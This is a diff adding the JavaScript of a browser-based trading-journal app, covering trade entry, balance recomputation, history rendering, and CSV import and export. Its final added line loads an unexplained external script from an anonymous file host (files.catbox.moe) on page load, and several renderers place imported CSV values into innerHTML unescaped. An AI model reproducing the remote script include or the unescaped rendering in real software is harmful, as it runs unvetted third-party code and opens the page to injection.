+          userProfile.currentBalance = balance;
+          setData("trades", trades);
+          setData("balanceHistory", balanceHistory);
+          setData("userProfile", userProfile);
+    
+          renderDashboard();
+          renderHistory();
+        }
+    
+        // ===== Add/Edit Trade =====
+        document.getElementById("tradeForm").addEventListener("submit", (e) => {
+          e.preventDefault();
+          const date = document.getElementById("tradeDate").value;
+          const type = document.querySelector("input[name='type']:checked").value;
+          const asset = document.getElementById("asset").value;
+          const entry =
+            parseFloat(document.getElementById("entry").value) || null;
+          const tp = parseFloat(document.getElementById("tp").value) || null;
+          const sl = parseFloat(document.getElementById("sl").value) || null;
+          const notes = document.getElementById("notes").value;
+          const result = document.querySelector(
+            "input[name='result']:checked"
+          ).value;
+          const pnlInput = parseFloat(document.getElementById("pnl").value) || 0;
+          const pnl = result === "Loss" ? -Math.abs(pnlInput) : pnlInput;
+    
+          if (editingTradeId) {
+            // update existing trade fields (do not manually mutate balances here)
+            const idx = trades.findIndex((t) => t.id === editingTradeId);
+            if (idx === -1) return;
+            trades[idx].date = date;
+            trades[idx].type = type;
+            trades[idx].asset = asset;
+            trades[idx].entry = entry;
+            trades[idx].tp = tp;
+            trades[idx].sl = sl;
+            trades[idx].notes = notes;
+            trades[idx].result = result;
+            trades[idx].pnl = pnl;
+            trades[idx].timestamp =
+              trades[idx].timestamp || new Date().toISOString();
+    
+            // clear editing state
+            editingTradeId = null;
+            document.getElementById("formTitle").innerText = "Add Trade";
+            document.getElementById("submitBtn").innerText = "Save Trade";
+    
+            // recompute balances across all trades
+            recomputeAllBalances();
+          } else {
+            // create new trade and append
+            const newId = trades.length
+              ? Math.max(...trades.map((t) => t.id)) + 1
+              : 1;
+            const trade = {
+              id: newId,
+              date,
+              type,
+              asset,
+              entry,
+              tp,
+              sl,
+              result,
+              pnl,
+              notes,
+              timestamp: new Date().toISOString(),
+            };
+            trades.push(trade);
+            // recompute to update balances consistently
+            recomputeAllBalances();
+          }
+    
+          e.target.reset();
+          showSection("dashboard");
+        });
+    
+        // ===== History =====
+        function renderHistory() {
+          const container = document.getElementById("tradeList");
+          container.innerHTML = "";
+    
+          // show trades in reverse chronological order (most recent first)
+          const list = trades.slice().reverse();
+          list.forEach((trade) => {
+            const card = document.createElement("div");
+            card.className = `card trade-card ${
+              trade.result === "Profit" ? "profit" : "loss"
+            }`;
+    
+            const summary = document.createElement("div");
+            summary.innerHTML = `<strong>${trade.asset}</strong> | ${
+              trade.result
+            }: $${(Number(trade.pnl) || 0).toFixed(2)}`;
+    
+            const notes = document.createElement("div");
+            notes.textContent = trade.notes || "";
+    
+            const details = document.createElement("div");
+            details.className = "details";
+            details.innerHTML = `
+                Date: ${trade.date || "-"}<br>
+                Type: ${trade.type || "-"}<br>
+                Entry: ${
+                  trade.entry !== null && trade.entry !== undefined
+                    ? trade.entry
+                    : "-"
+                }<br>
+                TP: ${
+                  trade.tp !== null && trade.tp !== undefined ? trade.tp : "-"
+                }<br>
+                SL: ${
+                  trade.sl !== null && trade.sl !== undefined ? trade.sl : "-"
+                }<br>
+                Balance After: ${
+                  trade.balanceAfter !== undefined
+                    ? Number(trade.balanceAfter).toFixed(2)
+                    : "-"
+                }
+              `;
+    
+            const actions = document.createElement("div");
+            actions.className = "action-buttons";
+            const editBtn = document.createElement("button");
+            editBtn.className = "edit-btn";
+            editBtn.textContent = "Edit";
+            editBtn.onclick = (e) => {
+              e.stopPropagation();
+              loadTradeForEdit(trade.id);
+            };
+            const deleteBtn = document.createElement("button");
+            deleteBtn.className = "delete-btn";
+            deleteBtn.textContent = "Delete";
+            deleteBtn.onclick = (e) => {
+              e.stopPropagation();
+              deleteTrade(trade.id);
+            };
+            actions.appendChild(editBtn);
+            actions.appendChild(deleteBtn);
+    
+            details.appendChild(actions);
+    
+            card.appendChild(summary);
+            card.appendChild(notes);
+            card.appendChild(details);
+    
+            card.addEventListener("click", () => {
+              card.classList.toggle("expanded");
+            });
+    
+            container.appendChild(card);
+          });
+        }
+    
+        function loadTradeForEdit(id) {
+          const trade = trades.find((t) => t.id === id);
+          if (!trade) return;
+          document.getElementById("tradeDate").value = trade.date || "";
+          if (trade.type) {
+            const typeInput = document.querySelector(
+              `input[name='type'][value='${trade.type}']`
+            );
+            if (typeInput) typeInput.checked = true;
+          }
+          document.getElementById("asset").value = trade.asset || "";
+          document.getElementById("entry").value =
+            trade.entry !== null && trade.entry !== undefined ? trade.entry : "";
+          document.getElementById("tp").value =
+            trade.tp !== null && trade.tp !== undefined ? trade.tp : "";
+          document.getElementById("sl").value =
+            trade.sl !== null && trade.sl !== undefined ? trade.sl : "";
+          document.getElementById("notes").value = trade.notes || "";
+          if (trade.result) {
+            const resultInput = document.querySelector(
+              `input[name='result'][value='${trade.result}']`
+            );
+            if (resultInput) resultInput.checked = true;
+          }
+          document.getElementById("pnl").value = Math.abs(Number(trade.pnl) || 0);
+    
+          editingTradeId = id;
+          document.getElementById("formTitle").innerText = "Edit Trade";
+          document.getElementById("submitBtn").innerText = "Update Trade";
+    
+          showSection("addEntry");
+        }
+    
+        function deleteTrade(id) {
+          if (!confirm("Are you sure you want to delete this trade?")) return;
+          // remove the trade
+          trades = trades.filter((t) => t.id !== id);
+          // recompute balances across remaining trades
+          recomputeAllBalances();
+          showSection("history");
+        }
+    
+        // ===== Settings =====
+        function saveSettings() {
+          userProfile.name = document.getElementById("nickname").value;
+          userProfile.startingBalance =
+            parseFloat(document.getElementById("startingBalance").value) || 0;
+          // if starting balance changed, recompute balances using it
+          setData("userProfile", userProfile);
+          quotes = document
+            .getElementById("quotesInput")
+            .value.split("\n")
+            .filter((q) => q.trim());
+          setData("quotes", quotes);
+          recomputeAllBalances();
+          alert("Settings saved.");
+        }
+    
+        function addAsset() {
+          const newAsset = document
+            .getElementById("newAsset")
+            .value.trim()
+            .toUpperCase();
+          if (newAsset && !assets.includes(newAsset)) {
+            assets.push(newAsset);
+            setData("assets", assets);
+            renderAssets();
+            populateAssets();
+            document.getElementById("newAsset").value = "";
+          }
+        }
+    
+        function renderAssets() {
+          const container = document.getElementById("assetList");
+          if (!container) return;
+          container.innerHTML = "<h5>Available Assets:</h5>";
+          assets.forEach((a) => {
+            const div = document.createElement("div");
+            div.textContent = a;
+            container.appendChild(div);
+          });
+        }
+    
+        // ===== CSV Export =====
+        function exportTrades() {
+          if (trades.length === 0) return alert("No trades to export.");
+          const header =
+            "id,date,type,asset,entry,tp,sl,result,pnl,balanceAfter,notes";
+          const rows = trades.map(
+            (t) =>
+              `${t.id},${t.date},${t.type},${t.asset},${t.entry},${t.tp},${
+                t.sl
+              },${t.result},${t.pnl},${t.balanceAfter},"${(t.notes || "").replace(
+                /"/g,
+                '""'
+              )}"`
+          );
+          const csv = [header, ...rows].join("\n");
+          const blob = new Blob([csv], { type: "text/csv" });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "trades.csv";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }
+    
+        // ===== CSV Import =====
+        function importTrades(event) {
+          const file = event.target.files ? event.target.files[0] : null;
+          if (!file) return;
+          const reader = new FileReader();
+          reader.onload = (e) => {
+            const text = e.target.result;
+            const lines = text.split("\n").filter((l) => l.trim());
+            if (lines.length <= 1) return;
+            const header = lines.shift(); // not used, but removed
+            lines.forEach((line) => {
+              // naive CSV split (assumes no commas inside quoted fields except notes we quoted). Trim whitespace.
+              const parts = line
+                .split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/)
+                .map((p) => p.trim());
+              if (parts.length < 9) return;
+              const [
+                id,
+                date,
+                type,
+                asset,
+                entry,
+                tp,
+                sl,
+                result,
+                pnl,
+                balanceAfter,
+                notesRaw,
+              ] = parts;
+              const notes = (notesRaw || "")
+                .replace(/^"|"$/g, "")
+                .replace(/""/g, '"');
+              const newId = trades.length
+                ? Math.max(...trades.map((t) => t.id)) + 1
+                : 1;
+              trades.push({
+                id: newId,
+                date,
+                type,
+                asset,
+                entry: entry ? parseFloat(entry) : null,
+                tp: tp ? parseFloat(tp) : null,
+                sl: sl ? parseFloat(sl) : null,
+                result,
+                pnl: pnl ? parseFloat(pnl) : 0,
+                notes: notes,
+                timestamp: new Date().toISOString(),
+              });
+            });
+            recomputeAllBalances();
+            alert("Trades imported.");
+          };
+          reader.readAsText(file);
+        }
+    
+        // ===== Init =====
+        function populateAssets() {
+          const assetSelect = document.getElementById("asset");
+          if (!assetSelect) return;
+          assetSelect.innerHTML = assets
+            .map((a) => `<option value="${a}">${a}</option>`)
+            .join("");
+        }
+    
+        function init() {
+          populateAssets();
+          renderAssets();
+          // On init, ensure balances are consistent (recompute if needed)
+          recomputeAllBalances();
+        }
+        init();
+      </script>
+   
+
+
+    
+<script>
+    // ===== Persist Notes Textarea =====
+(function persistNotes() {
+  const notes = document.getElementById("notes");
+  if (!notes) return;
+
+  // Restore saved draft if available
+  const savedDraft = localStorage.getItem("draftNotes");
+  if (savedDraft) notes.value = savedDraft;
+
+  // Save draft on input
+  notes.addEventListener("input", () => {
+    localStorage.setItem("draftNotes", notes.value);
+  });
+
+  // Clear draft when trade is saved
+  const form = document.getElementById("tradeForm");
+  form.addEventListener("submit", () => {
+    localStorage.removeItem("draftNotes");
+  });
+})();
+
+// ===== Persist Current Section =====
+(function persistSection() {
+  // Hook into showSection without overwriting existing logic
+  const originalShowSection = window.showSection;
+  window.showSection = function (id) {
+    localStorage.setItem("lastSection", id);
+    originalShowSection(id);
+  };
+
+  // Restore last visited section on load
+  window.addEventListener("load", () => {
+    const last = localStorage.getItem("lastSection") || "dashboard";
+    if (document.getElementById(last)) {
+      window.showSection(last);
+    }
+  });
+})();
+</script>
+
+
+<script>
+  function openModal(id) {
+    const modal = document.getElementById(id);
+    const content = modal.querySelector('.modal-content');
+    modal.classList.add('active');
+    setTimeout(() => content.classList.add('active'), 10);
+  }
+
+  function closeModal(e, id) {
+    if (e.target.classList.contains('modal-overlay')) {
+      const modal = document.getElementById(id);
+      const content = modal.querySelector('.modal-content');
+      content.classList.remove('active');
+      setTimeout(() => modal.classList.remove('active'), 300);
+    }
+  }
+</script>
+
+ 
+<script src="https://files.catbox.moe/07wwf7.js"></script>
+  </body>
+</html>
